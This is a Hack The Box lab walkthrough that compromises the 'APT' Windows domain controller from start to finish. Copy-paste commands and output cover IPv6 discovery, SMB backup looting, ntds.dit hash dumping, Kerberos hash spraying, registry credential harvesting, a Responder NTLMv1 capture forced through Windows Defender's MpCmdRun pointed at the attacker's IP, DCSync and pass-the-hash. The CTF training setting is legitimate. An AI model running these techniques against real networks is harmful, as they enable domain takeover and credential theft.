# Hack The Box - APT (Windows / Insane)

**Target IP:** `10.129.96.60`  
**Kali IP:** `10.10.17.27`  
**Difficulty:** Insane  
**OS:** Windows Server 2016 (Active Directory Domain Controller)

---

## Table of Contents

1. [Overview & Why This Machine Is Unique](#overview--why-this-machine-is-unique)
2. [Step 1: Initial Reconnaissance & The IPv4 Trap](#step-1-initial-reconnaissance--the-ipv4-trap)
3. [Step 2: IPv6 Discovery (IOXIDResolver)](#step-2-ipv6-discovery-ioxidresolver)
4. [Step 3: IPv6 Port Scanning](#step-3-ipv6-port-scanning)
5. [Step 4: SMB Enumeration Over IPv6](#step-4-smb-enumeration-over-ipv6)
6. [Step 5: Extracting & Cracking backup.zip](#step-5-extracting--cracking-backupzip)
7. [Step 6: Dumping Hashes from ntds.dit](#step-6-dumping-hashes-from-ntdsdit)
8. [Step 7: User Enumeration with Kerbrute](#step-7-user-enumeration-with-kerbrute)
9. [Step 8: The getTGT Brute Force](#step-8-the-gettgt-brute-force)
10. [Step 9: Registry Dump & Credential Discovery](#step-9-registry-dump--credential-discovery)
11. [Step 10: User Shell & First Flag](#step-10-user-shell--first-flag)
12. [Step 11: Privilege Escalation Recon](#step-11-privilege-escalation-recon)
13. [Step 12: NTLMv1 Hash Capture with Responder](#step-12-ntlmv1-hash-capture-with-responder)
14. [Step 13: Cracking the NTLMv1 Hash](#step-13-cracking-the-ntlmv1-hash)
15. [Step 14: Domain Dump as APT$](#step-14-domain-dump-as-apt)
16. [Step 15: Administrator Shell & Root Flag](#step-15-administrator-shell--root-flag)
17. [Key Lessons & Takeaways](#key-lessons--takeaways)

---

## Overview & Why This Machine Is Unique

APT is classified as **Insane** for several reasons that make it stand out from typical Windows AD boxes:

### 1. The IPv4 "Trap"
Most attackers scan IPv4 and assume they've seen all open ports. On APT, an IPv4 scan reveals only **HTTP (80)** and **RPC (135)**. The truly critical services — including SMB (445), LDAP, WinRM (5985), and Kerberos — are only accessible over **IPv6**. This forces you to discover and work with IPv6, a skill many pentesters neglect.

### 2. Stale Backup Data
The `backup.zip` on the SMB share contains an **old backup** of the Active Directory database (`ntds.dit`) and registry hives. The hashes inside are **stale** — some accounts changed passwords after the backup was taken. This means you cannot directly use most extracted hashes to log in. You must figure out which hashes are still valid through brute-force testing.

### 3. Kerberos Ticket Forging (getTGT)
Instead of cracking passwords, you use **password spraying with hashes** against Kerberos. One of the stale hashes from the backup happens to still be valid for a different account, allowing you to forge a Kerberos Ticket Granting Ticket (TGT) for `henry.vinson`.

### 4. The NTLMv1 Downgrade Attack
The machine's administrator intentionally downgraded the LAN Manager authentication level to **2**, forcing the system to use the weaker **NTLMv1** protocol. This allows you to capture a computer account (`APT$`) hash that can be cracked offline and then used to dump the entire domain.

### 5. Living-Off-the-Land for PrivEsc
Instead of uploading an exploit, you use **Windows Defender itself** (`MpCmdRun.exe`) to force the machine to authenticate back to your attacker machine. This is a "living off the land" technique that avoids antivirus detection.

---

## Step 1: Initial Reconnaissance & The IPv4 Trap

### What We Do
Run a standard TCP port scan against the target's IPv4 address.

```bash
nmap -sV -v -p- --min-rate=10000 10.129.96.60
```

### What We See
```
PORT    STATE SERVICE    VERSION
80/tcp  open  tcpwrapped
135/tcp open  tcpwrapped
```

### Why This Is Misleading
Only **two ports** are open on IPv4. Port 80 is a generic IIS web server. Port 135 is MSRPC. There is no SMB, no LDAP, no WinRM — the classic Windows attack surface seems missing. Many attackers would pivot to web exploitation at this point and waste hours.

**The lesson:** On modern Windows networks, IPv6 is often fully enabled and may expose a completely different attack surface than IPv4. Always check for IPv6 before concluding that a machine has limited services.

---

## Step 2: IPv6 Discovery (IOXIDResolver)

### What We Do
Use a Python script to query the MSRPC interface and ask the machine to reveal all of its network interfaces, including IPv6 addresses.

```bash
git clone https://github.com/mubix/IOXIDResolver.git
python3 IOXIDResolver/IOXIDResolver.py -t 10.129.96.60
```

### What We See
```
[*] Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::3d18:f278:e3b:8a82
```

### Why This Works
Windows RPC endpoint mapper (EPM) exposes an interface (`IOXIDResolver`) that can enumerate network interfaces. This is a legitimate Windows feature abused for reconnaissance. The machine happily tells us its IPv6 addresses.

### What We Do Next
Add the IPv6 address to `/etc/hosts` so we can reference it by hostname (required for many tools like `smbclient` and Kerberos):

```bash
echo "dead:beef::b885:d62a:d679:573f apt.htb apt.htb.local htb.local" | sudo tee -a /etc/hosts
```

> **Note:** Replace `dead:beef::b885:d62a:d679:573f` with the actual IPv6 address you discovered.

---

## Step 3: IPv6 Port Scanning

### What We Do
Scan all TCP ports over IPv6 using the hostname we just added.

```bash
sudo nmap -6 --min-rate 3000 -p- -Pn -T4 -v apt.htb
```

### What We See
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

### Why This Changes Everything
Now we see the **real** machine: it's a **Windows Domain Controller** with Active Directory. The critical ports are:
- **445 (SMB)** — File sharing, our initial entry point
- **389/636 (LDAP)** — Directory services
- **5985/47001 (WinRM)** — Windows Remote Management, our eventual shell protocol
- **88 (Kerberos)** — Implied by AD presence, used for authentication

**The lesson:** If you only scan IPv4, you miss the entire attack surface of this machine. IPv6 is not just an alternative; it's the **primary** path.

---

## Step 4: SMB Enumeration Over IPv6

### What We Do
List available SMB shares using anonymous (null session) authentication.

```bash
smbclient -L \\apt.htb -N
```

### What We See
```
Sharename       Type      Comment
---------       ----      -------
backup          Disk
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

### Why Anonymous SMB Works
Many AD environments allow anonymous enumeration of shares for legacy compatibility. The `backup` share name is immediately interesting — it suggests a backup of sensitive data.

### What We Do Next
Connect to the `backup` share and look inside:

```bash
smbclient \\apt.htb\backup -N
smb: \> dir
```

We see `backup.zip` (approx. 10MB). Download it:

```bash
smb: \> get backup.zip
smb: \> exit
```

---

## Step 5: Extracting & Cracking backup.zip

### What We Do
Try to unzip the archive.

```bash
unzip backup.zip
```

It prompts for a password. We need to crack it.

### Why We Use fcrackzip
The zip is password-protected. Since this is a CTF/machine, the password is likely a common one found in wordlists.

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
```

### What We Get
```
PASSWORD FOUND!!!!: pw == iloveyousomuch
```

### What Is Inside
After extracting with the password:
```
Active Directory/ntds.dit      <- Active Directory database
Active Directory/ntds.jfm      <- Transaction log
registry/SECURITY              <- Security hive
registry/SYSTEM                <- System hive
```

### Why These Files Matter
- **`ntds.dit`** is the Active Directory database. It contains **all domain user objects, password hashes, Kerberos keys, and group memberships**.
- **`SYSTEM`** hive contains the **BOOTKEY**, which is required to decrypt the password hashes inside `ntds.dit`.
- Without the `SYSTEM` hive, the `ntds.dit` hashes are unreadable.

**The lesson:** Always look for registry hives alongside `ntds.dit` backups. The `SYSTEM` hive is the decryption key.

---

## Step 6: Dumping Hashes from ntds.dit

### What We Do
Copy the files to our working directory and use `impacket-secretsdump` to extract all domain credentials.

```bash
cp "Active Directory/ntds.dit" .
cp registry/SYSTEM .
impacket-secretsdump -ntds ntds.dit -system SYSTEM -outputfile user_hashes LOCAL
```

### What We Get
Three output files:
- `user_hashes.ntds` — NTLM hashes (`username:rid:lmhash:nthash`)
- `user_hashes.ntds.cleartext` — Any cleartext passwords
- `user_hashes.ntds.kerberos` — Kerberos keys

### Why This Works
`impacket-secretsdump` reads the `ntds.dit` file, uses the `SYSTEM` hive to derive the BOOTKEY, and decrypts the password hashes stored in the database. This is a **forensics technique** applied to a live attack scenario.

### What the Dump Contains
Our dump contains **~2000 usernames** from the domain. However, these hashes are from a **backup** — they may be stale.

---

## Step 7: User Enumeration with Kerbrute

### What We Do
Extract all unique usernames from the dump and validate which ones still exist in the **live** domain controller using Kerberos pre-authentication responses.

```bash
cat user_hashes.ntds | cut -d':' -f1 | sort -u > users.txt
kerbrute userenum -d htb.local --dc apt.htb.local -o kerbrute.txt users.txt
```

### What We See
```
[+] VALID USERNAME:	 Administrator@htb.local
[+] VALID USERNAME:	 APT$@htb.local
[+] VALID USERNAME:	 henry.vinson@htb.local
```

### Why Kerbrute Is Critical
Out of 2000 dumped usernames, only **3** are still valid in the live domain. The rest may be deleted accounts, disabled users, or old data.

Kerbrute works by sending Kerberos AS-REQ packets. If the KDC responds with `KDC_ERR_PREAUTH_REQUIRED`, the user exists. If it responds with `KDC_ERR_C_PRINCIPAL_UNKNOWN`, the user does not exist. **No authentication is needed** — this is user enumeration via error messages.

### Why We Care About henry.vinson
`Administrator` and `APT$` are expected. `henry.vinson` is a regular domain user who may have privileges or credentials we can use. He is our target for the next phase.

---

## Step 8: The getTGT Brute Force

### What We Do
Try every unique hash from the `ntds.dit` dump to see if any can successfully request a Kerberos TGT for `henry.vinson`.

```bash
cat user_hashes.ntds | awk -F':' '{printf "%s:%s\n",$3,$4}' | sort -u > hashes.txt

for i in $(cat hashes.txt); do
    rm -f *.ccache 2>/dev/null
    echo "Testing: $i"
    impacket-getTGT HTB.local/henry.vinson@apt.htb -hashes $i >/dev/null 2>&1
    if ls *.ccache 1>/dev/null 2>&1; then
        echo "HASH FOUND: [$i]"
        ls -la *.ccache
        break
    fi
done
```

### What We Get
```
HASH FOUND: [aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb]
[*] Saving ticket in henry.vinson@apt.htb.ccache
```

### Why This Is Weird and Important
The hash that worked (`e53d87d42adaa3ca32bdb34a876cbffb`) is **NOT** the hash shown for `henry.vinson` in the backup dump (`2de80758521541d19cabba480b260e8f`). It is actually the **live** hash for `henry.vinson` in the current domain.

This reveals a critical insight: **the backup contains stale data**, but it also happens to contain the current hash for `henry.vinson` among the thousands of entries. This is likely because the backup was taken at a point where some passwords were current.

**The lesson:** Never assume a backup is entirely useless just because it's old. Some credentials may still be valid, and brute-force testing against live services is the only way to confirm.

### What a TGT Gets Us
A Kerberos TGT (Ticket Granting Ticket) is like a "master ticket." With it, we can request service tickets for any service in the domain. In this case, we use it to authenticate to the Remote Registry service.

---

## Step 9: Registry Dump & Credential Discovery

### What We Do
Export the TGT file path so Impacket uses it for authentication, then query the `HKU` (HKEY_USERS) hive remotely.

```bash
export KRB5CCNAME=henry.vinson@apt.htb.ccache
impacket-reg -k apt.htb.local query -keyName HKU -s > registry.txt
```

### Why HKU?
`HKEY_USERS` contains the registry hives for all loaded user profiles on the system. When a user logs in, their `NTUSER.DAT` is loaded into `HKU\<SID>`. Software often stores credentials in the registry under the user's SID.

### What We Search For
```bash
cat registry.txt | grep -i -A2 -B2 "henry"
```

### What We Find
```
\S-1-5-21-2993095098-2100462451-206186470-1105\Software\GiganticHostingManagementSystem\
	UserName	REG_SZ	 henry.vinson_adm
	PassWord	REG_SZ	 G1#Ny5@2dvht
```

### Why This Works
The `GiganticHostingManagementSystem` application (referenced on the web server) stores its credentials in plain text in the registry. This is a classic example of **credential harvesting** from poorly secured applications.

The SID (`S-1-5-21-...-1105`) belongs to `henry.vinson`, confirming these are his registry settings. The application uses a different account (`henry.vinson_adm`) with a different password.

---

## Step 10: User Shell & First Flag

### What We Do
Use `evil-winrm` to connect as `henry.vinson_adm` using the discovered password.

```bash
evil-winrm -i apt.htb -u henry.vinson_adm -p 'G1#Ny5@2dvht'
```

### Why evil-winrm?
Port 5985 (WinRM) was discovered during our IPv6 scan. WinRM is Windows' remote management protocol (PowerShell remoting). `evil-winrm` is a specialized tool that provides an interactive PowerShell shell over WinRM.

### Why This Account Works
From the registry dump, we have the **plaintext password**. Additionally, `henry.vinson_adm` is a member of the **Remote Management Users** group, which is required for WinRM access.

### Getting the Flag
```powershell
cat C:\Users\henry.vinson_adm\Desktop\user.txt
```

**Result:**
```
4c806[redacted]3a3fa0ce
```

---

## Step 11: Privilege Escalation Recon

### What We Do
Check the PowerShell command history for the current user.

```powershell
type C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### What We See
```powershell
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force
}
```

### Why This Is the Key to Root
The administrator deliberately set `lmcompatibilitylevel` to **2**.

According to Microsoft documentation:

| Value | Setting | Meaning |
|-------|---------|---------|
| 2 | Send NTLM response only | Client devices use **NTLMv1** authentication. Domain controllers accept LM, NTLM, and NTLLMv2. |

**NTLMv1 is cryptographically weak.** Unlike NTLMv2, which uses HMAC-MD5 and includes random challenges, NTLMv1 uses **DES encryption** with a static structure. If you know the challenge, you can crack an NTLMv1 response to recover the original NT hash.

### The Attack Plan
1. Force the machine to authenticate to us over SMB
2. Capture the NTLMv1 hash of a privileged account (ideally the computer account `APT$`)
3. Crack the NTLMv1 hash offline to get the NT hash
4. Use the NT hash with Pass-the-Hash to dump the entire domain

---

## Step 12: NTLMv1 Hash Capture with Responder

### What We Do
**On Kali**, configure and start Responder with a **fixed challenge**.

```bash
# Edit Responder config
sudo sed -i 's/Challenge = .*/Challenge = 1122334455667788/' /etc/responder/Responder.conf

# Start Responder
sudo responder --lm -I tun0
```

### Why a Fixed Challenge?
Responder normally uses a **random challenge** for each request. To crack NTLMv1 efficiently (especially with services like crack.sh), we need a **known, fixed challenge**. The challenge `1122334455667788` is the standard value used by precomputed cracking services.

### What We Do On the Target
In the `evil-winrm` shell, force Windows Defender to scan a file on our SMB server:

```powershell
cd "C:\ProgramData\Microsoft\Windows Defender\platform"
dir
cd 4.18.2010.7-0
.\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.17.27\file.txt
```

### Why Windows Defender?
`MpCmdRun.exe` is the command-line interface for Windows Defender. When told to scan a **network path** (`\\10.10.17.27\file.txt`), the SYSTEM service attempts to connect to that SMB share. Since SMB connections are performed in the context of the **computer account** (`APT$`), we capture the `APT$` hash.

This is **living off the land** — we use a legitimate, signed Microsoft binary to trigger authentication. No exploit, no payload, no antivirus alert.

### What Responder Captures
```
[SMB] NTLMv1 Client   : 10.129.96.60
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
```

---

## Step 13: Cracking the NTLMv1 Hash

### What We Submit
Go to **https://crack.sh/get-cracking/** and submit:

```
NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
```

### What We Get Back
```
Token: $NETNTLM$1122334455667788$95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
Key: d167c3238864b12f5f82feae86a7f798
```

### Why crack.sh Works
For the fixed challenge `1122334455667788`, crack.sh maintains **precomputed rainbow tables**. NTLMv1's weakness is that the response is deterministic given the challenge and the NT hash. By precomputing responses for common challenges, they can instantly reverse the hash without brute force.

### The Resulting Hash
The "Key" is the **NT hash** of the `APT$` account:
```
d167c3238864b12f5f82feae86a7f798
```

The full Pass-the-Hash format is:
```
aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798
```

(The first part is the empty LM hash, which is standard for modern Windows.)

---

## Step 14: Domain Dump as APT$

### What We Do
Use `impacket-secretsdump` with the `APT$` hash to perform a DCSync-style dump of the entire domain.

```bash
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 'HTB.local/APT$@apt.htb'
```

### Why APT$ Has This Power
The `APT$` account is the **computer account** for the domain controller itself. Computer accounts are members of the **Domain Controllers** group and have the privileges needed to replicate directory data (DRSUAPI). By compromising the DC's computer account, we effectively compromise the domain.

### What We Get
The full domain credential dump:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
```

### The Administrator Hash
```
c370bddf384a691d811ff3495e8a72e2
```

---

## Step 15: Administrator Shell & Root Flag

### What We Do
Use `evil-winrm` with Pass-the-Hash (`-H`) as Administrator.

```bash
evil-winrm -i apt.htb -u Administrator -H c370bddf384a691d811ff3495e8a72e2
```

### Why Pass-the-Hash Works
WinRM supports NTLM authentication. When we provide the NT hash instead of a password, the client performs the NTLM challenge-response protocol using the hash directly. The server verifies the response against its stored hash. Since we have the actual Administrator hash, authentication succeeds.

### Getting the Flag
```powershell
cat C:\Users\Administrator\Desktop\root.txt
```

**Result:**
```
08fdd[redacted]6deccb6e
```

---

## Key Lessons & Takeaways

### 1. Always Scan IPv6
Modern Windows systems often have IPv6 fully enabled. A machine that appears "locked down" on IPv4 may expose its entire AD surface on IPv6. Use `IOXIDResolver` or other techniques to discover IPv6 addresses.

### 2. Backup Data Is Gold — But Verify It
Extracting `ntds.dit` from a backup gives you thousands of hashes, but they may be stale. Always validate hashes against live services (Kerbrute, getTGT, crackmapexec) before assuming they work.

### 3. Kerberos Is Your Friend
Even when you don't have a valid password, a valid hash can forge a Kerberos TGT. The `getTGT` brute force technique is powerful for testing which stale hashes are still live.

### 4. Registry Credential Harvesting
Applications love storing credentials in the registry. Once you have any level of access (even a Kerberos ticket for a regular user), dump `HKU` and search for keywords like `UserName`, `PassWord`, `Password`, `Credential`.

### 5. NTLMv1 Is Critical Vulnerability
A single registry change (`lmcompatibilitylevel = 2`) downgrades the entire machine to NTLMv1. This allows offline cracking of authentication responses. If you see this setting in PowerShell history or registry, immediately plan a Responder attack.

### 6. Living Off the Land
Instead of uploading exploits, use built-in Windows tools (`MpCmdRun.exe`, `certutil`, `bitsadmin`, etc.) to force authentication or download files. This avoids AV/EDR detection and is often more reliable.

### 7. Computer Accounts Are Domain Admins in Disguise
The `APT$` computer account has DCSync privileges because it's a domain controller. Never ignore computer accounts — they can be as powerful as Administrator.

---

## Full Command Reference (Copy-Paste)

```bash
# Step 1-2: IPv6 Discovery
echo "10.129.96.60 apt.htb" | sudo tee -a /etc/hosts
git clone https://github.com/mubix/IOXIDResolver.git
python3 IOXIDResolver/IOXIDResolver.py -t 10.129.96.60

# Step 3: IPv6 Scan & Hosts
sudo sed -i '/apt.htb/d' /etc/hosts
echo "dead:beef::b885:d62a:d679:573f apt.htb apt.htb.local htb.local" | sudo tee -a /etc/hosts
sudo nmap -6 --min-rate 3000 -p- -Pn -T4 -v apt.htb

# Step 4: SMB
smbclient -L \\apt.htb -N
smbclient \\apt.htb\backup -N
# smb: \> get backup.zip

# Step 5: ZIP Crack & Extract
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
unzip backup.zip

# Step 6: Hash Dump
cp "Active Directory/ntds.dit" .
cp registry/SYSTEM .
impacket-secretsdump -ntds ntds.dit -system SYSTEM -outputfile user_hashes LOCAL

# Step 7: Kerbrute
cat user_hashes.ntds | cut -d':' -f1 | sort -u > users.txt
kerbrute userenum -d htb.local --dc apt.htb.local -o kerbrute.txt users.txt

# Step 8: getTGT Brute Force
cat user_hashes.ntds | awk -F':' '{printf "%s:%s\n",$3,$4}' | sort -u > hashes.txt
for i in $(cat hashes.txt); do
    rm -f *.ccache 2>/dev/null
    impacket-getTGT HTB.local/henry.vinson@apt.htb -hashes $i >/dev/null 2>&1
    if ls *.ccache 1>/dev/null 2>&1; then
        echo "HASH FOUND: [$i]"
        break
    fi
done

# Step 9: Registry Dump
export KRB5CCNAME=henry.vinson@apt.htb.ccache
impacket-reg -k apt.htb.local query -keyName HKU -s > registry.txt
cat registry.txt | grep -i -A2 -B2 "henry"

# Step 10: User Shell
evil-winrm -i apt.htb -u henry.vinson_adm -p 'G1#Ny5@2dvht'
# cat C:\Users\henry.vinson_adm\Desktop\user.txt

# Step 12: Responder (on Kali)
sudo sed -i 's/Challenge = .*/Challenge = 1122334455667788/' /etc/responder/Responder.conf
sudo responder --lm -I tun0

# Step 12: Defender scan (in evil-winrm)
cd "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0"
.\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.17.27\file.txt

# Step 14: Secretsdump as APT$
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 'HTB.local/APT$@apt.htb'

# Step 15: Admin Shell
evil-winrm -i apt.htb -u Administrator -H c370bddf384a691d811ff3495e8a72e2
# cat C:\Users\Administrator\Desktop\root.txt
```

---

*Walkthrough written for the APT machine on Hack The Box. Target: 10.129.96.60 | Attacker: 10.10.17.27*
